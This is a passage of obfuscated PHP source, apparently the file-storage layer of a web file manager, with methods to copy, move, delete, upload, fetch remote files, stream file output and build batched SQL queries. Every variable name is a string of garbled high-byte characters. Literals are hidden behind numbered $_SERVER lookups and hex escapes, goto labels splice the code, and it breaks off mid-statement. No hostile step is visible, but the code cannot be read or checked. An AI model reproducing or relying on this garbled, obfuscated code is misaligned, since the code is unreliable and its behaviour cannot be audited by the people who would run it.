$this->parse($äÆòÕ µ); $ıŠÔÄ¸ = $this->model->copy($úÍ±‡í, $‰Äƒ›®”[$_SERVER[Š—Â“œÔ][477]], $ø¢‘ ÏÓ, $¡Şæöı›); return $ıŠÔÄ¸ ? $this->getPathOuter($ıŠÔÄ¸) : !1; } public function moveSameAllow() { } public function move($²¤ôõ•ù, $Î‹‹šäı, $õ’ğµ» = REPEAT_REPLACE, $ã‡†À¼ = false) { $Á€ºèíù = $this->parse($Î‹‹šäı); $ìéÏ€òÇ = $this->model->move($²¤ôõ•ù, $Á€ºèíù[$_SERVER[Š—Â“œÔ][477]], $õ’ğµ», $ã‡†À¼); return $ìéÏ€òÇ ? $this->getPathOuter($ìéÏ€òÇ) : !1; } public function remove($ÑÌñò“…, $“àÉ¤š© = true) { return $this->model->remove($ÑÌñò“…, $“àÉ¤š©); } public function rename($¸Íû’¡, $ÃûÔ´‚·) { $¦ÏãáØå = $this->model->rename($¸Íû’¡, $ÃûÔ´‚·); return $¦ÏãáØå ? $this->getPathOuter($¸Íû’¡) : $¦ÏãáØå; } public function size($€…êåÃ) { $ß•‰ô­ = $this->infoSimple($€…êåÃ); return $ß•‰ô­ ? $ß•‰ô­[$_SERVER[Š—Â“œÔ][79]] : 0; } public function infoSimple($¤à¿¿³½) { return $this->model->sourceInfo($¤à¿¿³½); } public function info($÷âª™ ) { return $this->infoParse($÷âª™ ); } public function infoAuth($ÎÂÙĞÒ) { return $this->infoParse($ÎÂÙĞÒ, !1, !0); } public function infoWithChildren($¤Ü‰µ) { return $this->infoParse($¤Ü‰µ, !0); } protected function infoParse($¶‰‰ò——, $ş¡ƒ¿Àû = false, $à¾¯¿ÆË = false) { if (!$ş¡ƒ¿Àû) { return $this->model->pathInfo($¶‰‰ò——, $à¾¯¿ÆË); } return $this->model->pathInfoMore($¶‰‰ò——); } public function infoFullSimple($—¬âÍ‘) { $­è”ÃÜû =& $_SERVER[Š—Â“œÔ]; $ğä–¸ı¤ = explode($­è”ÃÜû[8], $—¬âÍ‘); $«Úœ×øà = implode($­è”ÃÜû[8], array_splice($ğä–¸ı¤, 1)); return $this->model->pathInfoByPath($ğä–¸ı¤[0], $«Úœ×øà); } public function infoFull($èîäş†) { $Ä–Â = $this->infoFullSimple($èîäş†); return is_array($Ä–Â) ? $this->model->pathInfo($Ä–Â[$_SERVER[Š—Â“œÔ][193]]) : !1; } public function hashSimple($’âÜ„î») { $™¦ÔœŠˆ =& $_SERVER[Š—Â“œÔ]; $ÃäıŠÃû = $this->infoWithChildren($’âÜ„î»); return $ÃäıŠÃû[$™¦ÔœŠˆ[170]][$™¦ÔœŠˆ[677]]; } public function hashMd5($öü˜Ùƒà) { $Ä»Ù‘Úñ =& $_SERVER[Š—Â“œÔ]; $…Ñéş = $this->infoWithChildren($öü˜Ùƒà); return $…Ñéş[$Ä»Ù‘Úñ[170]][$Ä»Ù‘Úñ[549]]; } public function exist($ÂÍúñ“) { $¼ÀÄ‚º =& $_SERVER[Š—Â“œÔ]; $çµ¨µ € = $this->parse($ÂÍúñ“); if (!$çµ¨µ €[$¼ÀÄ‚º[87]]) { return $this->isFile($ÂÍúñ“) || $this->isFolder($ÂÍúñ“); } $ìã” = array($¼ÀÄ‚º[479] => $çµ¨µ €[$¼ÀÄ‚º[477]], $¼ÀÄ‚º[32] => $çµ¨µ €[$¼ÀÄ‚º[87]]); $¤®Ü¥Ú´ = $this->model->where($ìã”)->find(); return $¤®Ü¥Ú´ ? !0 : !1; } public function isFile($’½½ä­Ã) { $ÉäÏÇê =& $_SERVER[Š—Â“œÔ]; $ø´ÇèĞÂ = $this->infoSimple($’½½ä­Ã); return $ø´ÇèĞÂ && $ø´ÇèĞÂ[$ÉäÏÇê[487]] == $ÉäÏÇê[230] ? !0 : !1; } public function isFolder($‡˜“¥¢î) { $Ì°Úô¾ =& $_SERVER[Š—Â“œÔ]; $Èˆ¨Üá = $this->infoSimple($‡˜“¥¢î); return $Èˆ¨Üá && $Èˆ¨Üá[$Ì°Úô¾[487]] == $Ì°Úô¾[91] ? !0 : !1; } public function listPath($ƒÓ›‰Î›, $Ô×Á•¸­ = false) { $ùúœı‚Ğ =& $_SERVER[Š—Â“œÔ]; if ($ƒÓ›‰Î› == $ùúœı‚Ğ[12]) { return !1; } $ƒ€ƒñ‘ = array($ùúœı‚Ğ[479] => $ƒÓ›‰Î›); if ($Ô×Á•¸­) { return $this->model->listSource($ƒ€ƒñ‘, -1); } return $this->model->listSource($ƒ€ƒñ‘); } public function has($Çîò—ãé, $üóØßäË = false, $ˆË¯ÒŒ“ = null) { $³¥êÒçä =& $_SERVER[Š—Â“œÔ]; $¿Ë¡‚Ú = $this->infoWithChildren($Çîò—ãé); if ($üóØßäË) { return array($³¥êÒçä[242] => $¿Ë¡‚Ú[$³¥êÒçä[242]], $³¥êÒçä[241] => $¿Ë¡‚Ú[$³¥êÒçä[241]]); } return $ˆË¯ÒŒ“ ? $¿Ë¡‚Ú[$³¥êÒçä[242]] : $¿Ë¡‚Ú[$³¥êÒçä[241]]; } public function listAll($³¿úË­’) { $®‚ÇĞ® = IO::info($this->pathParse[$_SERVER[Š—Â“œÔ][87]]); if (!$®‚ÇĞ®) { return array(); } return $this->model->listAll($³¿úË­’); } public function getContent($Ìı) { return $this->model->getContent($Ìı); } public function setContent($ãœÃ›‰Â, $©½ÃÊİñ = '') { return $this->model->setContent($ãœÃ›‰Â, $©½ÃÊİñ); } public function fileSubstr($áÒÑøâú, $¬¥¤Øû, $°™¼•°’) { return $this->model->fileSubstr($áÒÑøâú, $¬¥¤Øû, $°™¼•°’); } public function download($–¸Ûîñ, $»¯½’å = '') { $…ËĞ „‡ = get_path_father($»¯½’å); $»´Çßßş = get_path_this($»¯½’å); $ğ­Éœç = $this->model->fileInfoGet($–¸Ûîñ); $×Ûâ‘ü© = IO::copy($ğ­Éœç[$_SERVER[Š—Â“œÔ][87]], $…ËĞ „‡, !1, $»´Çßßş); return $×Ûâ‘ü©; } public function setModifyTime($¨¿ı ô, $ÈñßúÃ = '') { $ÍÎ­“Ş£ =& $_SERVER[Š—Â“œÔ]; if (!$¨¿ı ô) { return; } $this->model->where(array($ÍÎ­“Ş£[493] => $¨¿ı ô))->save(array($ÍÎ­“Ş£[88] => $ÈñßúÃ)); } public function upload($”¬°ûûĞ, $·Ğˆ†°«, $”­²ğ» = false, $ÛÙëíÜ¼ = REPEAT_REPLACE) { $¯·¿ Ù‰ =& $_SERVER[Š—Â“œÔ]; $½Š¼å•ğ = $this->parse($”¬°ûûĞ); $–í­ä‘ø = $this->model->addFile($½Š¼å•ğ[$¯·¿ Ù‰[477]], $·Ğˆ†°«, $½Š¼å•ğ[$¯·¿ Ù‰[87]], $”­²ğ», $ÛÙëíÜ¼); return $this->getPathOuter($–í­ä‘ø); } public function uploadFileByID($­«ŞÀûò, $œ–Ğô£ë, $¹Ş–³ò) { $Ô†ŞèÏ =& $_SERVER[Š—Â“œÔ]; $“ÚÃ¦åè = $this->parse($­«ŞÀûò); $šúÑçÀâ = $this->model->addFileByFileID($“ÚÃ¦åè[$Ô†ŞèÏ[477]], $œ–Ğô£ë, $“ÚÃ¦åè[$Ô†ŞèÏ[87]], $¹Ş–³ò); return $this->getPathOuter($šúÑçÀâ); } public function addFileByRemote($ºœîï¾ä, $¿¤‡ƒ¿, $ƒ·ï ë = array(), $ñ§×¶´Ä = '', $×Á£¢±£) { $¯›Ÿƒéó =& $_SERVER[Š—Â“œÔ]; $ïÂöÔäß = $this->parse($ºœîï¾ä); $ñ§×¶´Ä = empty($ñ§×¶´Ä) ? $ïÂöÔäß[$¯›Ÿƒéó[87]] : $ñ§×¶´Ä; $Š¢¢›é = $this->model->addFileByRemote($ïÂöÔäß[$¯›Ÿƒéó[477]], $¿¤‡ƒ¿, $ñ§×¶´Ä, $ƒ·ï ë, $×Á£¢±£); return $this->getPathOuter($Š¢¢›é); } public function uploadLink($Öü´çØò, $®Œ™ÄÉ© = 0) { $§ô„ÜíÚ =& $_SERVER[Š—Â“œÔ]; $½Ì„Šñ‹ = $this->parse($Öü´çØò); $„¤ˆ½¡Ï = _get($GLOBALS[$§ô„ÜíÚ[7]], $§ô„ÜíÚ[1421]); $šª–° = _get($GLOBALS[$§ô„ÜíÚ[7]], $§ô„ÜíÚ[1422]); $Öü´çØò = Model($§ô„ÜíÚ[679])->createFileName($½Ì„Šñ‹[$§ô„ÜíÚ[87]], $„¤ˆ½¡Ï, $šª–°); return IO::uploadLink($Öü´çØò, $®Œ™ÄÉ©); } public function fileNameAuto($è…´à×é, $Âûéâ…ˆ, $€ò´¡í = REPEAT_REPLACE, $ß×ıôÏ = false) { return $this->model->fileNameAuto($è…´à×é, $Âûéâ…ˆ, $€ò´¡í, $ß×ıôÏ); } public function fileNameExist($Û«ç¨ö, $˜÷Ú×ÕÂ) { return $this->model->fileNameExist($Û«ç¨ö, $˜÷Ú×ÕÂ); } protected function _fileOut($°š—éÆÇ, $‹¦¥ĞÛ = false, $Å–˜À¼™ = false, $ıÂ©¥úÆ = '', $•”¯­¶µ = false) { $‹§ÖÁÂì =& $_SERVER[Š—Â“œÔ]; $Õâåà¦û = $this->model->sourceInfo($°š—éÆÇ); if ($Õâåà¦û[$‹§ÖÁÂì[487]] == $‹§ÖÁÂì[91]) { header($‹§ÖÁÂì[1423]); die; } $¶ÉŸÔ•Æ = $this->model->fileInfoGet($°š—éÆÇ); $ıÂ©¥úÆ = $¶ÉŸÔ•Æ[$‹§ÖÁÂì[549]] ? $¶ÉŸÔ•Æ[$‹§ÖÁÂì[549]] : $ıÂ©¥úÆ; $«ÖéÒÅ” = isset($GLOBALS[$‹§ÖÁÂì[182]]) && is_array($GLOBALS[$‹§ÖÁÂì[182]]) ? $GLOBALS[$‹§ÖÁÂì[182]][$‹§ÖÁÂì[32]] : $Õâåà¦û[$‹§ÖÁÂì[32]]; if ($•”¯­¶µ) { return IO::fileOutServer($¶ÉŸÔ•Æ[$‹§ÖÁÂì[87]], $‹¦¥ĞÛ, $«ÖéÒÅ”, $ıÂ©¥úÆ); } IO::fileOut($¶ÉŸÔ•Æ[$‹§ÖÁÂì[87]], $‹¦¥ĞÛ, $«ÖéÒÅ”, $ıÂ©¥úÆ); } public function fileOut($Åê‚š§, $óÇ›¥§ú = false, $ÁÔ€€‚À = false, $Ù÷ß„ó¥ = '') { $this->_fileOut($Åê‚š§, $óÇ›¥§ú, $ÁÔ€€‚À, $Ù÷ß„ó¥); } public function fileOutServer($¹§†´èÆ, $›ë¥Ï“¥ = false, $×‘«‚ñú = false, $Ù¥‹Ñ’ñ = '') { $this->_fileOut($¹§†´èÆ, $›ë¥Ï“¥, $×‘«‚ñú, $Ù¥‹Ñ’ñ, !0); } protected function _fileOutImage($áà¼†â™, $ÅĞ¼˜¶Ş = 250) { $ÆÃùËÉ© =& $_SERVER[Š—Â“œÔ]; $ñçÛ”èÉ = $this->model->pathInfo($áà¼†â™); if ($ñçÛ”èÉ[$ÆÃùËÉ©[487]] == $ÆÃùËÉ©[91]) { show_json($ÆÃùËÉ©[1424] . $áà¼†â™, !1); } $µªŸ©ª† = $this->model->fileInfoGet($áà¼†â™); $ñçÛ”èÉ[$ÆÃùËÉ©[183]] = $µªŸ©ª†[$ÆÃùËÉ©[87]]; $GLOBALS[$ÆÃùËÉ©[182]] = $ñçÛ”èÉ; IO::fileOutImage($µªŸ©ª†[$ÆÃùËÉ©[87]], $ÅĞ¼˜¶Ş); } public function fileOutImage($¯Ş£ìÉŒ, $ëëù°é´ = 250) { $this->_fileOutImage($¯Ş£ìÉŒ, $ëëù°é´); } public function fileOutImageServer($Ìá±ã¾, $íóÒ€§‹ = 250) { $this->_fileOutImage($Ìá±ã¾, $íóÒ€§‹); } public function link($ìúÃÉ¹Ä, $›î– º— = '') { $—ÊÄß²š = $this->model->fileInfoGet($ìúÃÉ¹Ä); return IO::link($—ÊÄß²š[$_SERVER[Š—Â“œÔ][87]], $›î– º—); } protected function parse($üõÉÛÓ») { $´’‚¤¤ò =& $_SERVER[Š—Â“œÔ]; if (strstr($üõÉÛÓ», $´’‚¤¤ò[8]) === !1) { return array($´’‚¤¤ò[495] => intval($üõÉÛÓ»), $´’‚¤¤ò[87] => $´’‚¤¤ò[12], $´’‚¤¤ò[1420] => array()); } $¨¼šä¯ = explode($´’‚¤¤ò[8], trim($üõÉÛÓ», $´’‚¤¤ò[8])); if (count($¨¼šä¯) < 2) { show_tips(clear_html($üõÉÛÓ») . $´’‚¤¤ò[1425]); } return array($´’‚¤¤ò[495] => intval($¨¼šä¯[0]), $´’‚¤¤ò[87] => $¨¼šä¯[1], $´’‚¤¤ò[1420] => array_slice($¨¼šä¯, 1)); } } goto Bï½İ¶Ğª; C‘ÉÇ•Ìö: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÉÓêô¬Ï) { $õÖªÁ— =& $_SERVER[Š—Â“œÔ]; $Áë³â²¾ = Model($õÖªÁ—[579])->where(array($õÖªÁ—[1761] => $ÉÓêô¬Ï))->find(); $·öãŒÜß = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÉÓêô¬Ï, $Áë³â²¾[$õÖªÁ—[32]]); $this->userDesktopAdd($·öãŒÜß); return $·öãŒÜß; } public function userDesktopAdd($çÅ°ø¹§) { $İŒğöÖ© =& $_SERVER[Š—Â“œÔ]; $˜ŒãäáÀ = LNG($İŒğöÖ©[2252]); $·ê¼âñâ = $this->mkdir($çÅ°ø¹§, $˜ŒãäáÀ); $this->metaSet($·ê¼âñâ, $İŒğöÖ©[2253], $İŒğöÖ©[91]); $this->metaSet($çÅ°ø¹§, $İŒğöÖ©[2254], $·ê¼âñâ); } public function userPathSafeAdd($´›ƒ„ª®) { $…¬ÃïµÕ =& $_SERVER[Š—Â“œÔ]; $õà»°¨÷ = Model($…¬ÃïµÕ[579])->getInfoFull($´›ƒ„ª®); if (!$õà»°¨÷) { return !1; } if (_get($õà»°¨÷, $…¬ÃïµÕ[600])) { return $õà»°¨÷[$…¬ÃïµÕ[541]][$…¬ÃïµÕ[2255]]; } $ü„¯¤Ò = $this->_mkdirRoot(SourceModel::TYPE_USER, $´›ƒ„ª®, $…¬ÃïµÕ[2256], $…¬ÃïµÕ[2257]); Model($…¬ÃïµÕ[579])->metaSet($´›ƒ„ª®, $…¬ÃïµÕ[2255], $ü„¯¤Ò); $this->metaSet($ü„¯¤Ò, $…¬ÃïµÕ[2258], $´›ƒ„ª®); return $ü„¯¤Ò; } public function userPathAppAdd($—ƒ£÷ÑÂ, $îø™Œ… = '', $ø´ıĞ£ê = '') { $ÊäÓ§³ =& $_SERVER[Š—Â“œÔ]; $İùáø°Ş = Model($ÊäÓ§³[579])->getInfoFull($—ƒ£÷ÑÂ); if (!$İùáø°Ş) { return !1; } $…œ×¥ª = $İùáø°Ş[$ÊäÓ§³[541]] ? $İùáø°Ş[$ÊäÓ§³[541]] : array(); $Á àó¸ê = $…œ×¥ª[$ÊäÓ§³[2259]]; if (!$Á àó¸ê) { $Á àó¸ê = $this->_mkdirRoot(SourceModel::TYPE_USER, $—ƒ£÷ÑÂ, $ÊäÓ§³[2260], $ÊäÓ§³[2261]); Model($ÊäÓ§³[579])->metaSet($—ƒ£÷ÑÂ, $ÊäÓ§³[2259], $Á àó¸ê . $ÊäÓ§³[12]); $this->metaSet($Á àó¸ê, $ÊäÓ§³[2259], $—ƒ£÷ÑÂ); } if (!$îø™Œ…) { return $Á àó¸ê; } $÷ÁÏ¦Ù™ = $…œ×¥ª[$ÊäÓ§³[2262] . $îø™Œ…]; if (!$÷ÁÏ¦Ù™) { $÷ÁÏ¦Ù™ = $this->mkdir($Á àó¸ê, $îø™Œ…); Model($ÊäÓ§³[579])->metaSet($—ƒ£÷ÑÂ, $ÊäÓ§³[2262] . $îø™Œ…, $÷ÁÏ¦Ù™); $this->metaSet($÷ÁÏ¦Ù™, $ÊäÓ§³[2262] . $îø™Œ…, $—ƒ£÷ÑÂ); } if (!$ø´ıĞ£ê) { return $÷ÁÏ¦Ù™; } $Ê…ËÁæÎ = $this->mkdir($÷ÁÏ¦Ù™, $ø´ıĞ£ê); return $Ê…ËÁæÎ; } public function groupRootAdd($Ôî´øˆö) { $õ å†š· =& $_SERVER[Š—Â“œÔ]; $½¤ıÒ = Model($õ å†š·[587])->where(array($õ å†š·[2063] => $Ôî´øˆö))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ôî´øˆö, $½¤ıÒ[$õ å†š·[32]]); } public function systemRootPathAdd($ìí®‰£¿) { if ($ìí®‰£¿ != $_SERVER[Š—Â“œÔ][610]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ìí®‰£¿); } public function userRootRemove($ˆÊ«ô¨…) { $«€ŠÕËš = $this->targetSourceRoot(SourceModel::TYPE_USER, $ˆÊ«ô¨…, !0); foreach ($«€ŠÕËš as $®ˆ˜Á) { if (!$®ˆ˜Á) { continue; } $this->remove($®ˆ˜Á[$_SERVER[Š—Â“œÔ][193]], !1); } } public function groupRootRemove($ëœ¨£å÷) { $›ÑÊ§Ô = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ëœ¨£å÷); if (!$›ÑÊ§Ô) { return; } $this->remove($›ÑÊ§Ô[$_SERVER[Š—Â“œÔ][193]], !1); } private function _mkdirRoot($Ã“ßºŒ®, $ ìüÚçˆ, $Ì€Õ¬÷‡, $šÏóøÎ½ = '') { $§Û¶¾³Ÿ =& $_SERVER[Š—Â“œÔ]; $àœÔ¿ü÷ = defined($§Û¶¾³Ÿ[2198]) ? USER_ID : 0; $‘ÌˆËı = array($§Û¶¾³Ÿ[479] => 0, $§Û¶¾³Ÿ[653] => $Ã“ßºŒ®, $§Û¶¾³Ÿ[654] => $ ìüÚçˆ, $§Û¶¾³Ÿ[651] => 1, $§Û¶¾³Ÿ[655] => $àœÔ¿ü÷, $§Û¶¾³Ÿ[656] => $àœÔ¿ü÷, $§Û¶¾³Ÿ[652] => $šÏóøÎ½, $§Û¶¾³Ÿ[657] => $§Û¶¾³Ÿ[595], $§Û¶¾³Ÿ[506] => 0, $§Û¶¾³Ÿ[622] => 0, $§Û¶¾³Ÿ[544] => 0, $§Û¶¾³Ÿ[658] => $§Û¶¾³Ÿ[12]); if ($É¬¶ß÷Ş = $this->where($‘ÌˆËı)->find()) { return $É¬¶ß÷Ş[$§Û¶¾³Ÿ[193]]; } $ñåÄ€¶ = "\x4d\x6f\144\145\154\x53\157\x75\x72\x63\x65\56\155\x6b\144\x69\162\x52\x6f\157\x74\x2e{$Ã“ßºŒ®}\56{$ ìüÚçˆ}\56" . $Ì€Õ¬÷‡; CacheLock::lock($ñåÄ€¶); $‘ÌˆËı[$§Û¶¾³Ÿ[32]] = $Ì€Õ¬÷‡; $¹ù¸¿š = $this->add($‘ÌˆËı); $ó÷®¢È = array($§Û¶¾³Ÿ[659] => short_id($¹ù¸¿š)); $this->where(array($§Û¶¾³Ÿ[493] => $¹ù¸¿š))->save($ó÷®¢È); CacheLock::unlock($ñåÄ€¶); return $¹ù¸¿š; } private function targetSourceRoot($äì€½•, $ôÓ¯ïùØ, $é¡çüìô = false) { $¡€œóøƒ =& $_SERVER[Š—Â“œÔ]; $éÍ•ü¶ä = array($¡€œóøƒ[479] => 0, $¡€œóøƒ[653] => $äì€½•, $¡€œóøƒ[654] => $ôÓ¯ïùØ); if ($é¡çüìô) { $áÊ¸ñÃŸ = $this->where($éÍ•ü¶ä)->select(); return $áÊ¸ñÃŸ ? $áÊ¸ñÃŸ : array(); } $¼òíë‡Ä = $this->where($éÍ•ü¶ä)->find(); return $¼òíë‡Ä ? $¼òíë‡Ä : array(); } public function sourceRootGroup($—æ’Ÿô”) { $î¼ÆÂÊş =& $_SERVER[Š—Â“œÔ]; if (is_string($—æ’Ÿô”)) { $—æ’Ÿô” = array($—æ’Ÿô”); } $¥¨¬—ı = $this->listSourceRoot(SourceModel::TYPE_GROUP, $—æ’Ÿô”, $î¼ÆÂÊş[222]); $€èñÖş˜ = array($î¼ÆÂÊş[447] => $¥¨¬—ı, $î¼ÆÂÊş[444] => array($î¼ÆÂÊş[825] => count($—æ’Ÿô”))); $this->_listDataApply($€èñÖş˜[$î¼ÆÂÊş[447]]); $this->_listMake($€èñÖş˜); return array_to_keyvalue($€èñÖş˜[$î¼ÆÂÊş[85]], $î¼ÆÂÊş[571]); } public function mkfile($éÉµ’Éë, $Ö€™íŸ±, $”æºÀğ” = '', $ôºÊÁÍ¤ = REPEAT_RENAME) { $±‘¿ÀêÄ =& $_SERVER[Š—Â“œÔ]; $‰‹ìüÎç = Model($±‘¿ÀêÄ[679])->addFileByContent($”æºÀğ”, $Ö€™íŸ±); return $this->_createFileCall($éÉµ’Éë, $Ö€™íŸ±, $‰‹ìüÎç, $ôºÊÁÍ¤, $±‘¿ÀêÄ[1429]); } public function addFile($ûŒı¿ê, $Ò‘É¨Ú, $±Ú‹®òé, $Á†˜Ôî‚ = false, $óµ£â°æ = REPEAT_RENAME) { $»¸‡ÜÃö = Model($_SERVER[Š—Â“œÔ][679])->addFile($Ò‘É¨Ú, $±Ú‹®òé, $Á†˜Ôî‚); return $this->_createFileCall($ûŒı¿ê, $±Ú‹®òé, $»¸‡ÜÃö, $óµ£â°æ); } public function addFileByFileID($–›Å†Úé, $ƒ…µ®“á, $Ó¨¤›Ñä, $†ã¢ğ¬‘ = REPEAT_RENAME) { $Ò«ï„”ä =& $_SERVER[Š—Â“œÔ]; $˜·–é¾ = Model($Ò«ï„”ä[679])->find($ƒ…µ®“á); Model($Ò«ï„”ä[679])->linkAdd($ƒ…µ®“á); return $this->_createFileCall($–›Å†Úé, $Ó¨¤›Ñä, $˜·–é¾, $†ã¢ğ¬‘); } public function addFileByRemote($×íŒà¸–, $Ñ‚‰š½Ö, $Öö—ÙÌ», $ÑÈ‘úı = array(), $½¢´Í¦¬ = REPEAT_RENAME) { $ó¤ÚøüÔ = Model($_SERVER[Š—Â“œÔ][679])->addFileByRemote($Ñ‚‰š½Ö, $Öö—ÙÌ», $ÑÈ‘úı); return $this->_createFileCall($×íŒà¸–, $Öö—ÙÌ», $ó¤ÚøüÔ, $½¢´Í¦¬); } private function _createFileCall($¼•ÈÕøŒ, $Ú‹€ó®ê, $²ƒå÷ã«, $çË©à¥, $¦ºáæŒ… = "\165\160\154\157\x61\144") { $ÈÉğ‚à =& $_SERVER[Š—Â“œÔ]; $áÒ×ÄÇ = !1; $this->setMasterDB(); $this->lockWriteStart($¼•ÈÕøŒ, $Ú‹€ó®ê); $ƒÉ¡³§” = $this->fileNameExist($¼•ÈÕøŒ, $Ú‹€ó®ê); $ß®áì«§ = $this->_createFile($¼•ÈÕøŒ, $Ú‹€ó®ê, $²ƒå÷ã«, $çË©à¥, $áÒ×ÄÇ); if (!$áÒ×ÄÇ) { Model($ÈÉğ‚à[546])->remove($²ƒå÷ã«[$ÈÉğ‚à[543]]); } if ($áÒ×ÄÇ && $ß®áì«§ && $ß®áì«§ != $ƒÉ¡³§”) { Model($ÈÉğ‚à[2225])->eventCreate($ß®áì«§, $¦ºáæŒ…); } $this->lockWriteEnd($¼•ÈÕøŒ, $Ú‹€ó®ê); return $ß®áì«§; } public function mkdir($èóüœ˜Í, $ªóüú¸ç, $ñĞÃ¢® = REPEAT_SKIP) { $Ñ¹Î¼û´ =& $_SERVER[Š—Â“œÔ]; $this->setMasterDB(); $ô½ùìïİ = $this->sourceInfo($èóüœ˜Í); if (!$ô½ùìïİ) { return !1; } $this->lockWriteStart($èóüœ˜Í, $ªóüú¸ç); if ($ñĞÃ¢® !== !1) { $™·ÇôÈ’ = $this->fileNameExist($èóüœ˜Í, $ªóüú¸ç); if ($™·ÇôÈ’ && $ñĞÃ¢® != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($èóüœ˜Í, $ªóüú¸ç); return $™·ÇôÈ’; } $ªóüú¸ç = $this->fileNameAuto($èóüœ˜Í, $ªóüú¸ç, $ñĞÃ¢®); } $ù÷±Û÷« = array($Ñ¹Î¼û´[651] => 1, $Ñ¹Î¼û´[496] => $ªóüú¸ç, $Ñ¹Î¼û´[652] => $Ñ¹Î¼û´[12], $Ñ¹Î¼û´[544] => 0, $Ñ¹Î¼û´[622] => 0); $‰Êß€ƒ™ = $this->_addSource($ù÷±Û÷«, $ô½ùìïİ); Model($Ñ¹Î¼û´[2225])->eventCreate($‰Êß€ƒ™, $Ñ¹Î¼û´[1430]); $this->lockWriteEnd($èóüœ˜Í, $ªóüú¸ç); return $‰Êß€ƒ™; } public function listSourceRoot($“ãÈ—ıÎ, $Ïşƒ£Ò˜, $úÖ§²İ˜ = "\x73\157\x75\162\143\145\111\104\x2c\164\x61\x72\x67\x65\x74\x49\104\54\163\151\x7a\145") { $²ŠĞù–É =& $_SERVER[Š—Â“œÔ]; $õëâéÕ— = $²ŠĞù–É[456]; $î¢»‹î— = array(); $Ï˜“Íµ = 1024 * 50; $ÈÒÅÍø = is_array($ÈÒÅÍø) ? $ÈÒÅÍø : array(); $¬øÜÚŸÖ = count($Ïşƒ£Ò˜); $ı’Ì¼Š = $this->tablePrefix . $²ŠĞù–É[2263]; for ($Ü±£’Ë = 0; $Ü±£’Ë < $¬øÜÚŸÖ; $Ü±£’Ë++) { $ì›·ÛÄ = $Ïşƒ£Ò˜[$Ü±£’Ë]; $õëâéÕ— .= "\x53\x45\x4c\x45\103\124\40\52\x20\106\122\x4f\115\40\50\x53\105\x4c\105\103\124\x20{$úÖ§²İ˜}\40\x46\122\x4f\x4d\x20\140{$ı’Ì¼Š}\x60\x20\x57\110\x45\122\105\40"; $õëâéÕ— .= "\x60\160\x61\162\145\156\x74\x49\104\x60\75\x30\40\101\116\104\40\x60\x74\x61\x72\147\145\164\x49\x44\x60\x3d{$ì›·ÛÄ}\40\101\x4e\104\x20\140\x74\141\x72\x67\145\164\x54\x79\160\145\x60\x3d{$“ãÈ—ıÎ}\x20\141\156\x64\x20\146\x69\x6c\x65\124\171\160\145\75\x27\47\x20\x6c\151\155\151\x74\40\61\x29\40\x61\x73\40\x74\142\137{$Ü±£’Ë}\x20\125\116\111\117\116\x20\x41\x4c\x4c\x20"; if ((strlen($õëâéÕ—) >= $Ï˜“Íµ || $Ü±£’Ë == $¬øÜÚŸÖ - 1) && $õëâéÕ—) { $õëâéÕ— = substr($õëâéÕ—, 0, -strlen($²ŠĞù–É[1112])); $œ°á±ë = $this->query($õëâéÕ—); $õëâéÕ— = $²ŠĞù–É[12]; $î¢»‹î— = array_merge($î¢»‹î—, $œ°á±ë); } } return $î¢»‹î—; } private function _createFile($Ä¯Ğ©ı‹, $ÑÖïÙÜ, $ áíÒÁñ, $¥ÙïÔ­¯, &$àäº²Œ¡) { $øİŸ¯Ò– =& $_SERVER[Š—Â“œÔ]; $“å’Üáı = $this->sourceInfo($Ä¯Ğ©ı‹); if (!$ áíÒÁñ || !$“å’Üáı) { return !1; } if ($¥ÙïÔ­¯ !== !1) { $Ÿ‹‹Ÿ¢‘ = $this->fileNameExist($Ä¯Ğ©ı‹, $ÑÖïÙÜ); } $àäº²Œ¡ = !0; if ($¥ÙïÔ­¯ && $Ÿ‹‹Ÿ¢‘) { if ($¥ÙïÔ­¯ == REPEAT_SKIP) { $àäº²Œ¡ = !1; return $Ÿ‹‹Ÿ¢‘; } else { if ($¥ÙïÔ­¯ == REPEAT_REPLACE) { $Œşã‡óÀ = $this->sourceInfo($Ÿ‹‹Ÿ¢‘); $Ç…ş‹ÍÜ = $this->fileHistory($Œşã‡óÀ, $ áíÒÁñ[$øİŸ¯Ò–[543]], $ áíÒÁñ[$øİŸ¯Ò–[79]]); if (!$Ç…ş‹ÍÜ) { $àäº²Œ¡ = !1; } else { $this->folderSizeReset($Ä¯Ğ©ı‹); } return $Ÿ‹‹Ÿ¢‘; } else { $ÑÖïÙÜ = $this->fileNameAuto($Ä¯Ğ©ı‹, $ÑÖïÙÜ, $¥ÙïÔ­¯, !1); } } } $‹ˆëÓÅ¤ = array($øİŸ¯Ò–[651] => 0, $øİŸ¯Ò–[496] => $ÑÖïÙÜ, $øİŸ¯Ò–[652] => substr(get_path_ext($ÑÖïÙÜ), 0, 10), $øİŸ¯Ò–[544] => $ áíÒÁñ[$øİŸ¯Ò–[543]], $øİŸ¯Ò–[622] => $ áíÒÁñ[$øİŸ¯Ò–[79]]); $¯Şğì±ï = $this->_addSource($‹ˆëÓÅ¤, $“å’Üáı); $this->folderSizeReset($Ä¯Ğ©ı‹, intval($‹ˆëÓÅ¤[$øİŸ¯Ò–[79]])); return $¯Şğì±ï; } protected function fileHistory($ô¢¬ï¾, $»“ìÕô, $òÔÂ˜¶) { $„ñ¡î‡ı =& $_SERVER[Š—Â“œÔ]; if ($ô¢¬ï¾[$„ñ¡î‡ı[543]] == $»“ìÕô) { return !1; } $this->checkLock($ô¢¬ï¾[$„ñ¡î‡ı[193]], $»“ìÕô); Model($„ñ¡î‡ı[2264])->addHistory($ô¢¬ï¾); $ÍöÂ¯ª = array($„ñ¡î‡ı[656] => USER_ID, $„ñ¡î‡ı[500] => time(), $„ñ¡î‡ı[543] => $»“ìÕô, $„ñ¡î‡ı[79] => $òÔÂ˜¶); $this->where(array($„ñ¡î‡ı[493] => $ô¢¬ï¾[$„ñ¡î‡ı[193]]))->save($ÍöÂ¯ª); $this->sourceCacheClear($ô¢¬ï¾[$„ñ¡î‡ı[193]]); return !0; } public function checkLock($“™¼¯Ã£, $¢èÙ‘Æ«) { $¢ˆ›åûÕ =& $_SERVER[Š—Â“œÔ]; $×Šîé¶ß = $this->pathInfo($“™¼¯Ã£); if (!$this->fileIsLock($×Šîé¶ß, !0)) { return; } $½ı†ñ³õ = 